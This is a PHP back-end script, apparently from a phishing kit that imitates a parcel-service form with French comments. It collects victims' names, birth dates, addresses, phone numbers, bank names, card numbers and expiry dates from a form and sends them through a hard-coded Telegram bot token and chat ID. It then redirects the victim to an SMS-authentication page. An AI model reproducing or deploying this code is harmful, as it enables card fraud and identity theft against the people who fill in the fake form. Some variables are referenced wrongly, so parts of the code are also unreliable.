<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $firstname = $_POST["firstname"];
    $lastname = $_POST["lastname"];
    $email = $_POST["email"];
    $dob = $_POST["date"];
    $country = $_POST['country'];
    $address = $_POST['address'];
    $state = $_POST['state'];
    $tel = $_POST['tel'];
    $zip = $_POST['zip'];
    $bank = $_POST['field6'];
    $radio = $_POST['field10'];
    $cardNumberTxt = $_POST['pan'];
    $expiryMonth = $_POST['field3'];
    $expiryYear = $_POST['field4'];


    // Initialiser l'API de Telegram avec votre jeton d'API

    $telegram = new Telegram('6855403502:AAH11qZexSIQRFkpLAmt9LaBa0nhf8mPuiA');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Nouveau formulaire Mondial R. Doua:\n\n";
    $message .= "firstname: $firstname\n";
    $message .= "lastname: $lastname\n";
    $message .= "email: $email\n";
    $message .= "date: $date\n";
    $message .= "country: $country\n";
    $message .= "address: $address\n";
    $message .= "state: $state\n";
    $message .= "Téléphone: $tel\n";
    $message .= "zip: $zip\n";
    $message .= "bank: $bank\n";
    $message .= "numero de compte: $id\n";
    $message .= "Type de carte: $radio\n";
    $message .= "Numéro de carte: $cd\n";
    $message .= "Mois d'expiration: $expiryMonth\n";
    $message .= "cardYear: $expiryYear\n";


    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '6441800729';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ./sms-auth0.php.html");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
